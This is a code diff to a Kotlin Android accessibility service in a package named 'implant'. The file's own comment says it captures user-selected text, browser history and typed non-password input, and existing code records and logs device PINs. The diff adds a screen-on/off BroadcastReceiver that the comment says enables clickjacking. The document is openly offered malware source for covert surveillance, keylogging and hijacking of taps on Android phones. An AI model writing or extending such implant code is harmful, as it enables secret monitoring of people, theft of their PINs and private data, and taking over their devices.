@@ -5,11 +5,17 @@
 * 
 * Although this cannot see passwords from EditText due to Android's restrictions, we can see text
 * the user selects, browser history and non-password text they enter.
+*
+* This service also registers a BroadcastReceiver that listens for screen on and off events to
+* enable ClickJacking.
 * */
 package com.cooperthecoder.implant
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
+import android.content.BroadcastReceiver
+import android.content.Intent
+import android.content.IntentFilter
 import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
@@ -22,12 +28,14 @@ class DaggerService : AccessibilityService() {
     }
 
     lateinit var pinRecorder: PinRecorder
+    lateinit var receiver: BroadcastReceiver
 
     override fun onCreate() {
         super.onCreate()
         pinRecorder = PinRecorder(fun(pin: String) {
             Log.d(TAG, "Pin recorded: $pin")
         })
+        receiver = ScreenStateReceiver()
     }
 
     override fun onInterrupt() {
@@ -83,7 +91,24 @@ class DaggerService : AccessibilityService() {
                 AccessibilityEvent.TYPE_VIEW_CLICKED
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
         serviceInfo = info
+        registerScreenStateReceiver(receiver)
         Log.d(TAG, "Logging service started.")
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        unregisterScreenStateReceiver(receiver)
+    }
+
+
+    private fun registerScreenStateReceiver(receiver: BroadcastReceiver) {
+        val intentFilter = IntentFilter(Intent.ACTION_SCREEN_ON)
+        intentFilter.addAction(Intent.ACTION_SCREEN_OFF)
+        registerReceiver(receiver, intentFilter)
+    }
+
+    private fun unregisterScreenStateReceiver(receiver: BroadcastReceiver) {
+        unregisterReceiver(receiver)
     }
 
     private fun logEvent(event: AccessibilityEvent, message: String) {
